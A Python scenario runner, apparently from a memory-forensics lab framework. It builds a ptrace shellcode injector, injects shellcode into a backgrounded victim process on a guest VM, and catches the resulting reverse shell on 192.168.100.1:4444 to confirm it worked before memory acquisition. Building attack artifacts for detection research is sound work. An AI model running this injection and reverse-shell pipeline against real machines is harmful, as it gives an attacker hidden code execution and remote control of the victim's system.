"""Explicit runner for the ptrace foreign-allocation shellcode injection scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

from paramiko import SSHException

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import CommandLog, ScenarioClaim
from scenarios.ptrace_fa import shellcode

SCENARIO_ID = "user_procinj_ptracefa"
ROOT = Path(__file__).resolve().parent
FILES_DIR = ROOT / "files"
BUILD_SCRIPT = FILES_DIR / "build.sh"

_BUILDER_SOURCE_ROOT = "/tmp/ptrace-fa-source"
_BUILDER_BUILD_ROOT = "/tmp/ptrace-fa-build"
_BUILDER_SCRIPT = "/tmp/ptrace-fa-build.sh"

VICTIM_ROOT = "/tmp"

# Where the host listens for the reverse shell; it is the isolated lab
# network's host-side gateway (see infra/provider.py). The shellcode is
# retargeted to this host/port at build time (see shellcode.py).
LISTENER_HOST = "192.168.100.1"
LISTENER_PORT = 4444
SHELL_TIMEOUT = 15

SOURCE_FILES = (
    "src/shellcode_inject_fa.c",
    "src/victim.c",
    "common/ptrace_utils.c",
    "common/ptrace_utils.h",
    "common/utils.c",
    "common/utils.h",
)
ARTIFACT_NAMES = ("shellcode_inject_fa", "victim")
VICTIM_ARTIFACTS = tuple(f"/tmp/ptrace_fa-{name}" for name in ARTIFACT_NAMES)

# Backgrounded, nohup'd, and disowned so the victim (and the shell it later
# forks) survive the terminal closing while the run continues toward
# acquisition.
START_VICTIM_COMMAND = (
    f"nohup ./victim >{VICTIM_ROOT}/victim.log 2>&1 & disown; echo $!"
)


def get_scenario_claims() -> list[ScenarioClaim]:
    """Declare expected effects from successful scenario execution."""
    return [
        {
            "id": "binaries_installed",
            "statement": "The prepared injector and victim binaries were installed under /tmp.",
            "basis": [
                "command_log.jsonl#upload_artifact",
                "command_log.jsonl#install_shellcode_inject_fa",
                "command_log.jsonl#install_victim",
                "inputs/ptrace/shellcode_inject_fa",
                "inputs/ptrace/victim",
            ],
            "basis_type": "successful_execution_and_scenario_fact",
            "validation_limit": "Installation success does not independently verify final guest bytes or their persistence until acquisition.",
        },
        {
            "id": "victim_started",
            "statement": "The victim process was started and its PID was captured.",
            "basis": ["command_log.jsonl#start_victim"],
            "basis_type": "successful_command",
            "validation_limit": "The recorded launch and PID do not establish the complete process lifetime or state at capture.",
        },
        {
            "id": "injector_executed",
            "statement": "The ptrace injector completed against the recorded victim PID.",
            "basis": ["command_log.jsonl#inject_shellcode"],
            "basis_type": "successful_command",
            "validation_limit": "Injector exit status alone does not prove shellcode execution; the reverse-shell check supplies behavioral validation.",
        },
        {
            "id": "reverse_shell_validated",
            "statement": "The reverse shell returned the expected execution identity.",
            "basis": ["command_log.jsonl#validate_reverse_shell"],
            "basis_type": "successful_command",
            "validation_limit": "Validated before capture; the retained connection is not independently revalidated during acquisition.",
        },
        {
            "id": "victim_survived",
            "statement": "The victim passed the post-injection kill -0 check.",
            "basis": [
                "command_log.jsonl#check_victim_alive",
                "command_log.jsonl#validate_victim_survived",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "This establishes existence at the check, not later process health.",
        },
    ]


def build(ssh: SSHClient, staging: Path) -> tuple[tuple[Path, Path], str]:
    """Build the ptrace binaries on the builder VM."""
    artifacts = tuple(staging / name for name in ARTIFACT_NAMES)
    ssh.run_checked(
        f"rm -rf {_BUILDER_SOURCE_ROOT} && "
        f"mkdir -p {_BUILDER_SOURCE_ROOT}/src {_BUILDER_SOURCE_ROOT}/common"
    )
    for name in SOURCE_FILES:
        ssh.put(FILES_DIR / name, f"{_BUILDER_SOURCE_ROOT}/{name}")
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_SOURCE_ROOT} {_BUILDER_BUILD_ROOT} "
        f"{shellcode.target_hex(LISTENER_HOST, LISTENER_PORT)}",
        timeout=1800,
    )
    for name, artifact in zip(ARTIFACT_NAMES, artifacts, strict=True):
        ssh.get(f"{_BUILDER_BUILD_ROOT}/{name}", artifact)
    return artifacts, stdout


def build_source() -> dict:
    """Return hashes of the exact source files uploaded to the builder."""
    return {"files": {name: file_sha256(FILES_DIR / name) for name in SOURCE_FILES}}


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {
        "sha256": file_sha256(BUILD_SCRIPT),
        "target_hex": shellcode.target_hex(LISTENER_HOST, LISTENER_PORT),
    }


def run_ptrace_fa(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_paths: tuple[Path, Path],
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Execute the prepared PoC, inject shellcode, and validate the shell."""
    transcript_path.touch()
    listener = _open_listener()
    console.scope("HOST", "stage ptrace_fa artifacts")
    terminal = ssh.open_terminal()
    log = CommandLog(terminal, command_log_path)
    reverse_shell = None

    def close_reverse_shell() -> None:
        nonlocal reverse_shell
        if reverse_shell is None:
            return
        reverse_shell.close()
        reverse_shell = None

    try:
        _upload_artifacts(ssh, log, artifact_paths)
        with terminal:
            console.scope("GUEST", "verify prepared artifacts")
            guest_identity = log.run(
                "guest_identity",
                ". /etc/os-release; "
                'printf \'%s-%s %s\\n\' "$ID" "$VERSION_ID" "$(uname -m)"',
                timeout=180,
            ).combined_output
            try:
                expected = (
                    f"{build_record['target']['distro_id']} "
                    f"{build_record['target']['arch']}"
                )
                if guest_identity != expected:
                    raise RuntimeError(
                        f"ptrace_fa artifacts target {expected}, guest is {guest_identity}"
                    )
            except (OSError, RuntimeError, SSHException) as exc:
                log.note("verify_guest_identity", error=str(exc))
                raise
            log.note("verify_guest_identity")

            console.scope("GUEST", "prepare binaries")
            for source, name in zip(VICTIM_ARTIFACTS, ARTIFACT_NAMES, strict=True):
                log.run(
                    f"install_{name}",
                    f"install -m 0755 {source} {VICTIM_ROOT}/{name}",
                )
            log.run("enter_working_directory", f"cd {VICTIM_ROOT}")

            console.scope("GUEST", "start victim")
            identity = log.run("execution_identity", "id -un").combined_output.strip()
            # Interactive job control prints a "[1] <pid>" notice before the
            # echo output, so only the last line is the captured PID.
            victim_output = log.run(
                "start_victim", START_VICTIM_COMMAND
            ).combined_output.strip()
            victim_pid = victim_output.splitlines()[-1].strip()
            if not victim_pid.isdigit():
                raise RuntimeError(f"Victim PID was not captured: {victim_output!r}")

            console.scope("GUEST", "inject shellcode")
            log.run(
                "inject_shellcode",
                f"./shellcode_inject_fa {victim_pid}",
                timeout=30,
            )

            console.scope("HOST", "validate reverse shell")
            try:
                shell_identity, reverse_shell = _accept_reverse_shell(
                    listener, identity
                )
            except (OSError, RuntimeError, SSHException) as exc:
                log.note("validate_reverse_shell", error=str(exc))
                raise
            log.note("validate_reverse_shell")

            console.scope("GUEST", "validate victim survived")
            survived = log.run(
                "check_victim_alive", f"kill -0 {victim_pid} && echo alive"
            ).combined_output.strip()
            if survived != "alive":
                raise RuntimeError("Victim process did not survive injection")
            log.note("validate_victim_survived")
    except BaseException:
        close_reverse_shell()
        raise
    finally:
        listener.close()
        try:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
        except BaseException:
            close_reverse_shell()
            raise

    try:
        facts = {
            "victim_pid": int(victim_pid),
            "reverse_shell_identity": shell_identity,
            "listener_host": LISTENER_HOST,
            "listener_port": LISTENER_PORT,
        }
        assert reverse_shell is not None
        return facts, close_reverse_shell
    except BaseException:
        close_reverse_shell()
        raise


def _upload_artifacts(
    ssh: SSHClient,
    log: CommandLog,
    artifact_paths: tuple[Path, Path],
) -> None:
    console.step("uploading ptrace_fa artifacts...")
    try:
        for artifact, remote_path in zip(artifact_paths, VICTIM_ARTIFACTS, strict=True):
            ssh.put(artifact, remote_path)
    except (OSError, RuntimeError, SSHException) as exc:
        log.note("upload_artifact", error=str(exc))
        raise
    log.note("upload_artifact")


def _open_listener() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((LISTENER_HOST, LISTENER_PORT))
        sock.listen(1)
    except OSError as exc:
        sock.close()
        raise RuntimeError(
            f"Could not listen on {LISTENER_HOST}:{LISTENER_PORT} for the "
            f"shellcode's reverse shell: {exc}"
        ) from exc
    return sock


def _accept_reverse_shell(
    listener: socket.socket,
    expected_identity: str,
) -> tuple[str, socket.socket]:
    console.step(f"waiting for reverse shell on {LISTENER_HOST}:{LISTENER_PORT}...")
    conn = None
    try:
        listener.settimeout(SHELL_TIMEOUT)
        conn, _addr = listener.accept()
        conn.settimeout(SHELL_TIMEOUT)
        conn.sendall(b"id -un\n")
        identity = conn.recv(4096).decode(errors="replace").strip()
        if identity != expected_identity:
            raise RuntimeError(
                f"Reverse shell returned unexpected identity: {identity!r}"
            )
        console.ok(f"Reverse shell connected; identity confirmed: {identity}")
        return identity, conn
    except OSError as exc:
        if conn is not None:
            conn.close()
        raise RuntimeError(f"ptrace_fa reverse shell did not connect: {exc}") from exc
    except BaseException:
        if conn is not None:
            conn.close()
        raise
